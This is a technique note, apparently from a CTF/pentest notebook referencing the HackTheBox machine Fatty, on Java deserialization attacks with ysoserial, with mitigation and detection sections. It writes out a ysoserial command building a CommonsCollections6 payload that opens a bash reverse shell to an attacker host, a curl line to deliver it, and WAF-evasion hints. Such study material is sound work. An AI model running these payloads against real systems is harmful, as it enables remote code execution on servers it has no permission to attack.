---
topic: Java deserialization — gadget chains with ysoserial
tags: [linux, java, deserialization, ysoserial, commons-collections, fatty]
---

# Java deserialization — gadget chains with ysoserial

[🌐 Español](java-deserialization-ysoserial.md) | **English**

## Idea

Java serializes objects with `ObjectOutputStream` and rebuilds them with `ObjectInputStream`. If the application reads an object from an untrusted source, the `readObject` methods of classes on the classpath run during reconstruction. A gadget chain (for example Commons Collections) links methods up to `Runtime.exec`. `ysoserial` generates those ready-to-send payloads. On Fatty a server feature accepted serialized objects and allowed command execution in the container.

## When it applies

- The server accepts binary data starting with `AC ED 00 05` or its base64 form `rO0AB`.
- Gadget libraries are on the classpath (Commons Collections, Spring, Groovy, Rome).
- The service is RMI, JMS, an HTTP API or a custom socket.
- The Java and library versions allow the chain.

## Procedure

1. Locate the point receiving serialized objects.
2. Identify classpath libraries (errors, `pom.xml`, JARs).
3. Use `URLDNS` to confirm deserialization (outbound DNS).
4. Pick a compatible chain and generate the payload.
5. Send it and confirm execution (reverse shell or test file).

## Commands

```bash
java -jar ysoserial.jar URLDNS 'http://<DNS-CALLBACK>/' > dns.bin
java -jar ysoserial.jar CommonsCollections6 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' > payload.bin
base64 -w0 payload.bin
```

```bash
curl -s --data-binary @payload.bin http://<HOST>:<PORT>/<PATH>
```

```text
AC ED 00 05  ->  Java serialization header
```

## Variants

- `CommonsCollections1` through `7` depending on the library version.
- `JRMPClient` to connect back to a custom JRMP listener.
- `Spring1`/`Spring2` when Spring is on the classpath.
- Send the payload as base64 if the endpoint expects text.
- If a WAF blocks it, fragment or compress the object.

## Limitations

- The chain must exist on the classpath and match the Java version.
- Deserialization filters (`ObjectInputFilter`) block classes.
- The payload may need a specific header or wrapper.
- Execution is blind without output; use a callback.

## Mitigation

- Never deserialize user data; use JSON or another logic-free format.
- Apply `ObjectInputFilter` with class allowlists.
- Update libraries and remove unnecessary gadgets from the classpath.
- Sign and encrypt internal messages; restrict who can send them.
- Run services with least privilege and in isolated containers.

## Detection

- Bodies starting with `AC ED 00 05` or `rO0AB`.
- Binary `Content-Type` requests to endpoints expecting JSON.
- Outbound DNS from the server after a request.
- Java processes spawning `bash`, `sh` or `cmd` unexpectedly.

## References

- [ysoserial](https://github.com/frohoff/ysoserial)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [0xdf — Fatty](https://0xdf.gitlab.io/2020/08/08/htb-fatty.html)
- [Fatty writeup](../../machines/linux/fatty/README.en.md)
